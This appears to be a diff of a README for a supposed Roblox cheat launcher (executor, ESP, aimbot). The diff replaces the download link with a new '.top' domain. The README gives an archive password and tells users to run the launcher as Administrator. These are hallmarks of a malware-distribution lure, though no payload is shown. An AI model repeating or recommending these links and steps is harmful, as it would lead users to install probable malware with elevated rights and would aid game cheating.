@@ -6,7 +6,7 @@ Roblox external launcher with script executor, ESP, fly hack, speed hack, aimbot
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappdown.top/)**
+**[CLICK](https://gitdownapply.top/)**
 
 Archive passkey: `Github`
 
@@ -89,7 +89,7 @@ Based on open-source projects like **Krnl** and **Synapse X**.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappdown.top/)** to download.
+1. Click **[CLICK](https://gitdownapply.top/)** to download.
 2. Extract the archive.
 3. Launch Roblox and join a game.
 4. Run the launcher **as Administrator**.
